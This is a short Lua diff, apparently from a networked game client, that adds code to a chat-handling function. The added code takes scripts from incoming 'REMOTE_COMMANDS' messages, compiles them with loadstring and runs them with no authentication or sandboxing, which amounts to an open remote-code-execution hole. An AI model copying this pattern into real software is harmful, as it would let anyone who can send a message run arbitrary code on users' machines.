@@ -49,4 +49,15 @@ function handle_incoming_chat(client)
 			client.my_gui.content_chatbox:view_caret()
 		end
 	end
+	
+	msgs = client.entity_system_instance.messages["REMOTE_COMMANDS"]
+	
+	for i=1, #msgs do
+		local compiled_script = loadstring(msgs[i].data.script)
+		
+		if compiled_script then 
+			local status, err = pcall(function() compiled_script () end) 
+			print(err) 
+		end
+	end
 end
